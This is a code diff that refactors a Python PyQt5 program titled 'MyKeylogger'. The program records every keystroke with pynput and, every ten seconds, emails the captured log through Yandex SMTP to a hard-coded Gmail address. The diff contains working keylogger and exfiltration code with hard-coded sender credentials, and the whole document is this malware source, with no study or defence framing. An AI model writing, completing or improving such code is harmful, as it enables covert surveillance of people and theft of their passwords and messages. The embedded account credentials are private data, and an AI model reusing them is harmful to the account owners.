@@ -3,61 +3,71 @@ import threading
 from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QLineEdit
 import pynput.keyboard
 import smtplib
+from getpass import getpass
 
 log = ""
 
-def callbackFunc(key):
-    global log
-    try:
-        log += key.char
-    except AttributeError:
-        if key == key.space:
-            log += " "
-        else:
-            log += str(key)
+class KeyloggerThread(threading.Thread):
+    def __init__(self):
+        super().__init__()
+        self.keyloggerListener = pynput.keyboard.Listener(on_press=self.callbackFunc)
+        self.log = ""
 
-def sendEmail(email, password, message):
-    try:
-        emailServer = smtplib.SMTP_SSL("smtp.yandex.com", 465)
-        emailServer.login(email, password)
-        emailServer.sendmail(email, "ahmetzincir27@gmail.com", message)
-        emailServer.quit()
-    except Exception as e:
-        print("Email gönderme hatası:", e)
+    def callbackFunc(self, key):
+        try:
+            self.log += key.char
+        except AttributeError:
+            if key == key.space:
+                self.log += " "
+            else:
+                self.log += str(key)
 
-def threadFunc():
-    global log
-    sendEmail("drewbarrymore34@yandex.com", "edncntkucviklakx", log)
-    log = ""
-    timerObj = threading.Timer(10, threadFunc)
-    timerObj.start()
+    def run(self):
+        self.keyloggerListener.start()
+        self.send_email_periodically()
 
-keyloggerListener = pynput.keyboard.Listener(on_press=callbackFunc)
+    def send_email_periodically(self):
+        while True:
+            if self.log:
+                send_email_thread = threading.Thread(target=self.send_email, args=(self.log,))
+                send_email_thread.start()
+                self.log = ""
+            threading.Event().wait(10)  # wait for 10 seconds before checking again
 
-def main():
-    app = QApplication(sys.argv)
-    window = QMainWindow()
-    window.setGeometry(100, 100, 400, 250)
-    window.setWindowTitle("MyKeylogger")
+    def send_email(self, message):
+        email = "drewbarrymore34@yandex.com"
+        password = "360d0e1bbb9946132a3ec4f7a1e49bee"
+        try:
+            emailServer = smtplib.SMTP_SSL("smtp.yandex.com", 465)
+            emailServer.login(email, password)
+            emailServer.sendmail(email, "ahmetzincir27@gmail.com", message)
+            emailServer.quit()
+            print("Email sent successfully!")
+        except Exception as e:
+            print("Email sending error:", e)
 
-    text_edit = QTextEdit(window)
-    text_edit.move(50, 50)
-    text_edit.resize(300, 150)
-    text_edit.setEnabled(False)
-    text_edit.setStyleSheet("color: red;")
-    text_edit.setPlainText(log)
+class MainWindow(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setGeometry(100, 100, 400, 250)
+        self.setWindowTitle("MyKeylogger")
 
-    search_edit = QLineEdit(window)
-    search_edit.move(50, 20)
-    search_edit.resize(300, 20)
-    search_edit.setStyleSheet("color: blue;")
+        self.text_edit = QTextEdit(self)
+        self.text_edit.move(50, 50)
+        self.text_edit.resize(300, 150)
+        self.text_edit.setEnabled(False)
+        self.text_edit.setStyleSheet("color: red;")
 
-    window.show()
+        self.search_edit = QLineEdit(self)
+        self.search_edit.move(50, 20)
+        self.search_edit.resize(300, 20)
+        self.search_edit.setStyleSheet("color: blue;")
 
-    keyloggerListener.start()
-    threadFunc()
-
-    sys.exit(app.exec_())
+        self.keylogger_thread = KeyloggerThread()
+        self.keylogger_thread.start()
 
 if __name__ == "__main__":
-    main()
+    app = QApplication(sys.argv)
+    window = MainWindow()
+    window.show()
+    sys.exit(app.exec_())
